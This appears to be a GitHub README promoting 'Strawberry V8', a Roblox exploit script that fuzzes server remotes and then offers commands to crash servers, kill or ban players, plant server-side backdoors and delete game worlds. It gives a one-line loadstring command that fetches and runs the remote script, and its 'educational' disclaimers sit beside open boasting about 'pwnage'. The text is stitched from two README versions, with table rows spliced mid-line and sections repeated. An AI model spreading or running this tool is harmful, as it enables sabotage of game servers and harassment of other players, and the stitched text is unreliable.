🍓 Strawberry V8
Strawberry is a powerful Roblox LUAU script that finds and weaponizes server-side vulnerabilities, giving the player FE admin commands. This version is a complete overhaul for maximum pwnage.
⚠️ For educational and research purposes only. Don't be a dick.
✨ Features V8
🔍 Advanced Remote Fuzzer – Scans RemoteEvents and RemoteFunctions with multi-argument permutations to discover complex vulnerabilities beyond simple deletion.
💣 More Destructive Commands - Now includes server crashers, global player manipulation, and tools for server-side infection.
🛠️ Vulnerability Classification – Intelligently determines the type of vulnerability found (e.g., Deletion, Physics, Property Manipulation) to enable more specific commands.
📜 Multi Executor Support – You can run this script on any level 7+ executor (e.g., Synapse X, Script-Ware).
🧠 Dynamic Command System – Provides a powerful suite of FE admin commands that adapt based on the vulnerability found.
⚡ Optimized & Fast – Rewritten for performance. Scans are quick and efficient.
📝 Enhanced Logging – Dumps detailed game info, a full remote list, and the specific vulnerability found to your webhook for analysis.
📦 Installation
Get a Level 7+ Roblox Executor.
Copy the Script – loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/level7.lua"))()
Execute in Roblox – Paste into your executor and run in-game.
⚙️ New/Upgraded Command List
Command	Description
kill	Kills the targeted player.
crash	Attempts to lag or crash the server by spamming the vuln remote.
fling	Flings a targeted player.
globalfling	Attempts to fling every player in the server.
infect	Tries to plant a server-side backdoor for code execution.
server ban	Kicks a player and prevents them from rejoining.
nuke	Deletes the entire workspace. Chaos.
...and all the classics.
🧠 How It Works
Strawberry V8 dynamically scans for remote events/functions. It creates temporary parts and fires remotes with a wide array of argument patterns (fuzzing) to test for server-side reactions. It looks for object deletion, physics manipulation, and other state changes. Once a vulnerability is confirmed, it crafts a specific fireMethod to exploit it, unlocking a set of powerful commands.
🚧 Disclaimer
This repository is for educational and security research purposes. Using this script to fuck with other users is on you. Can lead to bans. Don't be an idiot.| `goto`   | Go to a player   |
| `brickify`  | Makes the target's character a bunch of bricks|
| `kick`   | Kicks the player from the server|
| `server ban`   | **Server** bans the player        |

*More commands added frequently!*

---

## 🧠 How It Works

Strawberry dynamically scans for **remote events/functions** exposed to the client. Once found, it attempts controlled invocations to test which ones respond to inputs and can be hijacked to run arbitrary server-side actions.

---

## 🚧 Disclaimer

This repository is for **educational** and **security research** purposes only.  😉
Using this script to interfere with or damage other users' gameplay is a violation of Roblox’s Terms of Service and can result in bans or other consequences.

---

## 📫 Contact

Have suggestions, issues, or want to contribute?  
Open an [issue](https://www.discord.com/users/1244738630270980177) or submit a pull request!

---

## ⭐ Star the Repo

If you found this project useful or interesting, consider giving it a ⭐️ to show support!

